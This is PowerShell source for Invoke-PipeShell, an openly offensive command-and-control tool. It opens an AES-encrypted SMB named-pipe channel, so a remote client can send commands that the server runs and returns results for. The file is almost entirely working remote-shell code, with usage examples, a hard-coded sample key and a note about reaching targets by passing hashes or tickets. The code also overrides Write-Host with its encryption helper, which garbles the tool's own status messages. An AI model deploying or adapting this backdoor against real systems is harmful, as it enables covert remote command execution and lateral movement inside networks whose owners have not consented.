function Invoke-PipeShell {
<#
.SYNOPSIS
	Invoke-Pipe uses named pipes to create an SMB C2 channel. The SMB
	traffic is encrypted using AES CBC (code from Empire), the key/pipe
	are generated randomly by the server on start-up.

	This is heavily based on Ruben Boonen (@FuzzySec) Invoke-SMBShell
    https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-SMBShell.ps1

	This version reverses the Client/Server model of Invoke-SMBShell.
	In server mode, the server waits for connections, executes commands, and returns results
    In client mode, the client connects to servers, issues commands, and displays results

	Notes:

	* To connect, the client needs to be able to initialize an SMB
	  connection to the target (eg: net use \\server\share). the client
	  must be running in a context that has permission to the accout the
	  server is running. A connection could be made with different user credentials
	  or by passing the hash/ticket. Not unreasonable in a corporate
	  environment.

.DESCRIPTION
	Author: Joe Vest (@joevest)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER Mode
	Client or Server

.PARAMETER Server
	Hostname of Server

.PARAMETER AESKey
	16 character key used for encryption

.PARAMETER Pipe
	Name of server's named pipe

.PARAMETER Timeout
	Time in milliseconds a client will consider a server unreachable

.PARAMETER CommandTimeout
	Time in seconds a command will run until is it considered dead.  The server will return any output it has
	
.PARAMETER i
	Use interactive shell.  If false, a single command will be issued from the -c parameter

.PARAMETER c
	command to run in non-interactive mode	

.EXAMPLE
	Server mode, hosts the named pipe.

    C:\PS> Import-Module .\Invoke-PipeShell.ps1; Invoke-PipeShell -mode server -aeskey PmsqQUt2PoYMFNq7 -pipe tapsrv.5604.1234 -commandtimeout 30

.EXAMPLE
	Client mode, connects to the named pipe.

	Interactive Client

	C:\PS> Import-Module .\Invoke-PipeShell.ps1; Invoke-PipeShell -mode client -server localhost -aeskey PmsqQUt2PoYMFNq7 -pipe tapsrv.5604.1234 -i
	
	Non-interactive client
	C:\PS> Import-Module .\Invoke-PipeShell.ps1; Invoke-PipeShell -mode client -server localhost -aeskey PmsqQUt2PoYMFNq7 -pipe tapsrv.5604.1234 -c ls


	Extra commands
	----------------
	leave - exits client, leaves server running
	kill - kill server and client

#>

	param( 
		[Parameter(Mandatory=$false)]
		[string]$Mode, 					
		[Parameter(Mandatory=$false)]
		[string]$Server,				
		[Parameter(Mandatory=$true)]
		[string]$AESKey,				
		[Parameter(Mandatory=$true)]
		[string]$Pipe,					
		[Parameter(Mandatory=$false)]
		[Int]$timeout = 1000,
		[Parameter(Mandatory=$false)]
		[Int]$commandtimeout = 120,
		[Parameter(Mandatory=$false)]
		[string]$c = "",
		[Parameter(Mandatory=$false)]
		[switch]$i = $FALSE
	)

    if ($AESKey.length -ne 16) {
    	Write-Host "`n[1] AESKey must be 16 characters in length."
    	return
    }

    if ($mode -eq "client") {
	    if ((!$i) -and (!$c)) {
	    	Write-Host "`n[!]You must specify Interactive or Command mode (-c or -i)"
	    	return
	    }
	}

    if ($i) {$INTERACTIVE = $TRUE} 

	# Set the function Mode
	$PipeMode = $mode

	# Crypto functions from Empire agent
	# https://github.com/PowerShellEmpire/Empire/blob/master/data/agent/agent.ps1#L514
	function Encrypt-Bytes {
		param($bytes)
		# get a random IV
		$IV = [byte] 0..255 | Get-Random -count 16
		$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
		$AES.Mode = "CBC";
		$AES.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
		$AES.IV = $IV;
		$ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
		# append the MAC
		$hmac = New-Object System.Security.Cryptography.HMACSHA1;
		$hmac.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
		$ciphertext + $hmac.ComputeHash($ciphertext);
	}

	function Decrypt-Bytes {
		param ($inBytes)
		if($inBytes.Length -gt 32){
			# Verify the MAC
			$mac = $inBytes[-20..-1];
			$inBytes = $inBytes[0..($inBytes.length - 21)];
			$hmac = New-Object System.Security.Cryptography.HMACSHA1;
			$hmac.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
			$expected = $hmac.ComputeHash($inBytes);
			if (@(Compare-Object $mac $expected -sync 0).Length -ne 0){
				return;
			}
	
			# extract the IV
			$IV = $inBytes[0..15];
			$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
			$AES.Mode = "CBC";
			$AES.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
			$AES.IV = $IV;
			($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
		}
	}

	# Generate 16 friendly random characters
	function Random-16 {
		$Seed = 1..16|ForEach-Object{Get-Random -max 62};
		$CharSet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		$CharSet[$Seed] -join ""
	}

	# Write pipe helper function
	function Write-Host {
		param ($data)
		$Input = Encrypt-Bytes -bytes $([system.Text.Encoding]::UTF8.GetBytes($data))
		$Input = ($Input -join ' ' |Out-String).trim()
		$Input
	}

	# Read pipe helper function
	function Read-Data {
		param ($data)
		$data = $data -split ' '
		$OutPut = [System.Text.Encoding]::UTF8.GetString($(Decrypt-Bytes -inBytes $data))
		$OutPut
	}

	# Job are used here to support long running commands but
	# for now the shell doesn't have logic to specifically
	# invoke a job for such commands and IEX for others.
	function Command-Handler {
		param($data)

		try {
			$JobName = "SMBJob-$(Random-16)"

			$s = [scriptblock]::Create($data)

			$PoshJob = Start-Job -Name $JobName -Scriptblock ($s)
			Wait-Job -Timeout $commandtimeout -Name $PoshJob.Name| Out-Null

			#if ($((Get-Job $PoshJob.Name).HasMoreData) -eq $true) {
				# On Win10+ even jobs with no results show HasMoreData=True
			$JobResult = $(Receive-Job -Name $PoshJob.Name 2>&1 | Out-String)
	            
			if ($JobResult -eq $null) {
				$JobResult = "No Output"
		    }

		    if (!$JobResult) {
				$JobResult = "No Output"
		    }

		    if ($JobResult -eq "") {
				$JobResult = "No Output"
		    }

		} catch{
			Write-Host "ERROR"
			$JobResult = "ERROR"
		}
		
        Return $JobResult
	}

	function Initialize-Pipe {
		if ($PipeMode -eq "Server") {
			Write-Host "`n[>] Waiting for client..`n"
			$PipeObject.WaitForConnection()
		} else {
			try {
			# Add a 1s time-out in case the server is not live
			$PipeObject.Connect($timeout)
			} catch {
				Write-Host "[!] Server pipe not available!"
				Return
			}
		}

		$PipeReader = $PipeWriter = $null
		$PipeReader = new-object System.IO.StreamReader($PipeObject)
		$PipeWriter = new-object System.IO.StreamWriter($PipeObject)
		$PipeWriter.AutoFlush = $true

		Initialize-Session
	}

	function Initialize-Session {
		try {
			while($true) {

				# Client logic
				if ($PipeMode -eq "Client") {


					if ($INTERACTIVE) { 
						$Command = Read-Host "`n[$computer] SMB Shell"
					} else {
						$Command = $c
					}
				
					if ($Command) {
						$PipeWriter.WriteLine($(Write-Host -data $Command))
						Read-Data -data $($PipeReader.ReadLine())

						# Disconnect client
						# Non-Interactive Mode
						if (-Not $INTERACTIVE) { 
							$Command = "leave"
							$PipeWriter.WriteLine($(Write-Host -data $Command))
							break
						}
						# Interactive Mode
						if ($Command -eq "leave") {
							break
						}

						# Interactive Mode
						if ($Command -eq "kill") {
							break
						}
					}
				}

				# Server logic
				else {

					$Command = $pipeReader.ReadLine()
			
					if ($Command) {
						if ($(Read-Data -data $command) -eq "leave") {

							if ($INTERACTIVE) { 
								$PipeWriter.WriteLine($(Write-Host -data "`n[!] Client disconnecting.."))
								Write-Host "Client disconnecting.."
								break
							} else { # Non-interactive
								Write-Host "Client disconnecting.."
								break
							}

					} elseif ($(Read-Data -data $command) -eq "kill") {
							$PipeWriter.WriteLine($(Write-Host -data "`n[!] Killing server.."))
							Write-Host "Killing server.."
							break

						} else {
							$Result = Command-Handler -data $(Read-Data -data $Command)
							$PipeWriter.WriteLine($(Write-Host -data $Result))
						}
					}
				}
			}
		}

		catch {
			# Maybe add real error handling some day...
			$ErrorMessage = $_.Exception.Message
    		$FailedItem = $_.Exception.ItemName
    		$line = $_.InvocationInfo.ScriptLineNumber

    		Write-Host "ERROR:"
    		Write-Host $ErrorMessage
    		Write-Host $FailedItem
    		Write-Host "Error on line : $line"

		}

		# Cleanup & leave logic
		finally {
			if ($PipeMode -eq "Server") {
			    # Kill Server
				if ($(Read-Data -data $command) -eq "kill") {
					$PipeObject.Dispose()
				# This else also recovers the server pipe
				# should the client fail for some reason
				} else {
					$PipeObject.Disconnect()
					Initialize-Pipe
				}
			} else {
				$PipeObject.Dispose()
			}
		}
	}

	# Generate Key/Pipe
	if ($PipeMode -eq "Server") {
		Try {$PipeObject = New-Object System.IO.Pipes.NamedPipeServerStream($Pipe, [System.IO.Pipes.PipeDirection]::InOut)}
		Catch {Write-Host $_;Return}
		$ServerConfig = @"
+-----------------------------------
| Host Name      : $Env:COMPUTERNAME
| Named Pipe     : $Pipe
| AES Key        : $AESKey
| CommandTimeout : $CommandTimeout
+-----------------------------------
"@
		$ServerConfig
	
	} else { # Client Mode
		Try {$PipeObject = new-object System.IO.Pipes.NamedPipeClientStream($Server, $Pipe, [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation)}
		Catch {Write-Host $_;Return}
		$ClientConfig = @"
+-----------------------------------
| Host Name      : $Env:COMPUTERNAME
| Named Pipe     : $Pipe
| AES Key        : $AESKey
| Timeout        : $Timeout
+-----------------------------------

Please, type "kill" to exit..

"@		
		$ClientConfig
	}

	Initialize-Pipe
}